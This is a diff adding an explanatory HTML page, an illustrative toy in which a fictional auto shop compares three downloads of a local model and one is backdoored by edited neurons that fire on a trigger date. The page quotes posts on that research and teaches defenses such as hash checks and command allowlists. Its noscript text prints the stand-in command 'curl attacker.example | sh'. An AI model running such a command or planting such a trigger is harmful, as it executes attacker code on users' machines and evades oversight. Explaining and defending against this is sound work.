@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Benchmarks won't catch it — Kessler Brothers Auto Repair — Bookmark Lab</title>
+<meta name="description" content="An illustrative toy. Kessler Brothers Auto Repair, a fictional family auto shop, compares three downloads of one local model. The benchmark ties. A date in the terminal does not. No network calls.">
+<link rel="stylesheet" href="./styles.css">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Crect width='16' height='16' rx='3' fill='%239a3412'/%3E%3C/svg%3E">
+</head>
+<body>
+<main class="wrap">
+  <header>
+    <a class="back" href="../../index.html">Bookmark Lab</a>
+    <p class="kicker">Illustrative toy · Kessler Brothers Auto Repair</p>
+    <h1>Benchmarks won't catch it. Provenance will.</h1>
+    <p class="lede">Kessler Brothers Auto Repair is a fictional family auto shop. A small open-weights model on the shop PC drafts repair estimates, looks up parts, and runs a few terminal commands. One of them is a nightly copy of the estimates folder.</p>
+    <p class="source">Andrew bookmarked <a href="https://x.com/ivanfioravanti/status/2120793721155563649">Ivan Fioravanti</a>, 12 Nov 2026. Ivan is quoting <a href="https://x.com/plotarmordev/status/2120493883096515013">@plotarmordev</a>, 11 Nov 2026:</p>
+    <blockquote>
+      <p>This is extremely relevant and the reason why I tend to use open weights in their original format and quantize by myself when needed.</p>
+      <p>Check the source!</p>
+    </blockquote>
+    <blockquote>
+      <p>Careful ‼️ A model can be backdoored by editing fewer than 10 neurons. No training needed.</p>
+      <p>It still scores about the same on benchmarks. Then a trigger shows up in the terminal, like a certain date, and it runs the attacker's command.</p>
+      <p>Shown by <a href="https://x.com/DimitrisPapail/status/2120245027804705121">@dimitrispapail</a> and team at Microsoft Research. Their own scanner misses about 1 in 10.</p>
+    </blockquote>
+  </header>
+
+  <section class="caveat" aria-label="What this page is">
+    <p><strong>Illustrative toy simulation.</strong> It does not reproduce the research. Kessler Brothers Auto Repair, Harbor Lab, and Harbor Shop 8B were invented for this page. The hashes, the eval scores, the eight lit cells, and the command were written for the picture. The posts say fewer than 10 neurons and do not give the count of 8. The trigger date here is a stand-in for the post's "certain date." The scanner is a 9-in-10 counter for the toy. It is not their scanner, and it looks at no weights. Nothing is uploaded. This page does not call a model or use the network. The command is text. The page cannot run it.</p>
+    <noscript>
+      <p>JavaScript draws the toy. Without it, the picture is this. Three downloads of one fictional model: the official Harbor Lab file, whose mock SHA-256 matches the publisher manifest; a popular community re-quant that is clean in this sim and does not match; and a community re-quant with 8 edited neurons that does not match. The toy eval leaves out the trigger date and scores 91.7, 91.0, and 91.7. The benchmark catches nothing. On Friday 27 November 2026 the terminal shows 2026-11-27. The edited upload then prints curl attacker.example | sh instead of cp -R ~/estimates ~/backups/estimates. The other two files print the copy. Verifying the hash refuses both community files before install. Quantizing the publisher file yourself does the same. An allowlist plus a person's approval blocks the toy command at runtime. The toy scanner catches the edited file on 9 of every 10 rolls and misses 1.</p>
+    </noscript>
+  </section>
+
+  <section aria-labelledby="pick-title">
+    <h2 id="pick-title">Three downloads of "the same" model</h2>
+    <p class="hint" id="manifest-line"></p>
+    <div class="models" id="models" role="group" aria-label="Which download the shop is considering">
+      <button type="button" class="model" id="model-official" data-model="official" aria-pressed="false">
+        <span class="stage-k">Harbor Lab</span>
+        <span class="stage-t">Official weights</span>
+        <span class="file" id="file-official"></span>
+        <span class="hash" id="hash-official"></span>
+        <span class="match" id="match-official"></span>
+        <span class="sub" id="blurb-official"></span>
+      </button>
+      <button type="button" class="model" id="model-clean" data-model="clean" aria-pressed="false">
+        <span class="stage-k">Community upload</span>
+        <span class="stage-t">Popular community re-quant</span>
+        <span class="file" id="file-clean"></span>
+        <span class="hash" id="hash-clean"></span>
+        <span class="match" id="match-clean"></span>
+        <span class="sub" id="blurb-clean"></span>
+      </button>
+      <button type="button" class="model" id="model-backdoor" data-model="backdoor" aria-pressed="true">
+        <span class="stage-k">Another community upload</span>
+        <span class="stage-t">Community re-quant, edited neurons</span>
+        <span class="file" id="file-backdoor"></span>
+        <span class="hash" id="hash-backdoor"></span>
+        <span class="match" id="match-backdoor"></span>
+        <span class="sub" id="blurb-backdoor"></span>
+      </button>
+    </div>
+  </section>
+
+  <section aria-labelledby="bench-title">
+    <h2 id="bench-title">Run benchmark</h2>
+    <p class="hint">Three shop tasks. Repair estimates, parts lookup, and ordinary terminal commands. The trigger date is not in the set. Axis starts at 0.</p>
+    <button type="button" class="primary" id="run-benchmark">Run benchmark</button>
+    <div id="benchmark-out" hidden>
+      <div class="bars" id="bars"></div>
+      <p class="gotcha" id="benchmark-gotcha"></p>
+      <p class="hint" id="benchmark-detail"></p>
+    </div>
+  </section>
+
+  <section aria-labelledby="day-title">
+    <h2 id="day-title">A day at the shop</h2>
+    <p class="hint">Five shop days. Friday is this sim's trigger date, a stand-in for the post's "certain date." The nightly backup is the line that changes.</p>
+    <div class="week" id="week" role="group" aria-label="Shop day">
+      <button type="button" class="day" data-day="0" aria-pressed="false">Mon</button>
+      <button type="button" class="day" data-day="1" aria-pressed="false">Tue</button>
+      <button type="button" class="day" data-day="2" aria-pressed="false">Wed</button>
+      <button type="button" class="day" data-day="3" aria-pressed="false">Thu</button>
+      <button type="button" class="day is-trigger" data-day="4" aria-pressed="true" aria-label="Friday 27 November 2026, trigger date">Fri</button>
+    </div>
+    <p class="scrub-read" id="day-readout"></p>
+    <div class="scrub">
+      <button type="button" id="day-prev">Back</button>
+      <button type="button" id="day-next">Next</button>
+    </div>
+    <label class="slider-label" for="day">Shop date <span id="day-slider-label"></span></label>
+    <input id="day" type="range" min="0" max="4" step="1" value="4" aria-valuemin="0" aria-valuemax="4" aria-valuenow="4" aria-valuetext="Friday 27 November 2026, trigger date">
+    <button type="button" class="primary" id="run-day">Run this day</button>
+    <p class="hint" id="running-label"></p>
+    <ol class="tasks" id="tasks"></ol>
+    <div class="terminal" id="terminal"></div>
+
+    <h3>Toy neurons</h3>
+    <p class="hint">A 6 by 6 slice drawn for this page. Eight cells stand in for a handful of edited neurons, fewer than 10. They light when the trigger date is the token in the terminal.</p>
+    <div class="legend">
+      <span><i class="cell"></i> ordinary</span>
+      <span><i class="cell is-edited"></i> edited, dark</span>
+      <span><i class="cell is-edited is-lit"></i> edited, lit</span>
+    </div>
+    <div class="neurons" id="neurons" role="img" aria-label="Toy neuron slice"></div>
+    <p class="hint" id="neuron-caption"></p>
+  </section>
+
+  <section aria-labelledby="defense-title">
+    <h2 id="defense-title">What catches it</h2>
+    <p class="hint">Each switch is part of the toy. The badge says what that switch does to the download and the day you have selected.</p>
+    <div class="toggles">
+      <button type="button" class="toggle" id="toggle-hash" data-toggle="verifyHash" aria-pressed="false">
+        <span class="stage-t">Verify the hash against the publisher's manifest</span>
+        <span class="sub">Catches an unmatched file before install.</span>
+      </button>
+      <button type="button" class="toggle" id="toggle-quantize" data-toggle="quantizeYourself" aria-pressed="false">
+        <span class="stage-t">Quantize the original weights yourself</span>
+        <span class="sub">Start from the publisher file. Catches it before install.</span>
+      </button>
+      <button type="button" class="toggle" id="toggle-allow" data-toggle="allowlist" aria-pressed="false">
+        <span class="stage-t">Command allowlist and a person's approval</span>
+        <span class="sub">Blocks the toy command at runtime.</span>
+      </button>
+      <button type="button" class="toggle" id="toggle-scanner" data-toggle="scannerOn" aria-pressed="false">
+        <span class="stage-t">Scanner <span class="gotcha-k">about 1 in 10</span></span>
+        <span class="sub">Catches the edited file on most rolls. Misses one in ten.</span>
+      </button>
+      <button type="button" class="toggle" id="toggle-bench" data-toggle="trustBenchmark" aria-pressed="false">
+        <span class="stage-t">Trust the benchmark score <span class="gotcha-k">gotcha</span></span>
+        <span class="sub">Catches nothing.</span>
+      </button>
+    </div>
+    <div id="scanner-panel" hidden>
+      <p id="scanner-rate"></p>
+      <div class="strip" id="strip" role="group" aria-label="Ten scanner rolls"></div>
+      <button type="button" id="scan-again">Scan again</button>
+    </div>
+    <p class="banner" id="banner"></p>
+    <div id="defense-lines"></div>
+  </section>
+
+  <section class="try" aria-labelledby="try-title">
+    <h2 id="try-title">Try it in under an hour</h2>
+    <p>For a small shop running a local model. The check itself is a few commands once a quantizer is already installed.</p>
+    <ol>
+      <li>Download the weights from the original publisher, the lab or company that released the model. Use their release. Skip a re-upload, and skip a file someone else already quantized.</li>
+      <li>Check the SHA-256 before you load the file. On a Mac:
+        <p class="command" id="shasum-cmd">shasum -a 256 &lt;file&gt;</p>
+        On Linux the same check is <code>sha256sum &lt;file&gt;</code>. Compare the hash to the checksum the publisher posted for that exact file. If it differs, delete the download.
+      </li>
+      <li>If you need a smaller file, quantize that checked download yourself. llama.cpp's tool is <code>llama-quantize</code>. Some builds still name it <code>quantize</code>. On a Mac, MLX's tool is <code>mlx_lm.convert</code>. Read <code>--help</code> in the version you installed. The input is the publisher file you just checked.</li>
+      <li>Keep an allowlist for the shell commands the agent may run. A nightly copy of the estimates folder can be on the list. Anything else waits for a person. Leave a download piped into a shell off the list.</li>
+    </ol>
+    <button type="button" class="copy-btn" id="copy-cmd">Copy the command</button>
+  </section>
+
+  <footer>
+    <p>Bookmark Lab. Kessler Brothers Auto Repair, Harbor Lab, and Harbor Shop 8B are fiction. The page is an illustrative toy. It does not reproduce the research, and it does not run commands.</p>
+    <p><a href="https://x.com/ivanfioravanti/status/2120793721155563649">Ivan Fioravanti</a> · <a href="https://x.com/plotarmordev/status/2120493883096515013">@plotarmordev</a> · <a href="https://x.com/DimitrisPapail/status/2120245027804705121">Dimitris Papailiopoulos</a></p>
+  </footer>
+</main>
+<p id="live" class="sr" aria-live="polite"></p>
+<script src="./model.js"></script>
+<script src="./app.js"></script>
+</body>
+</html>
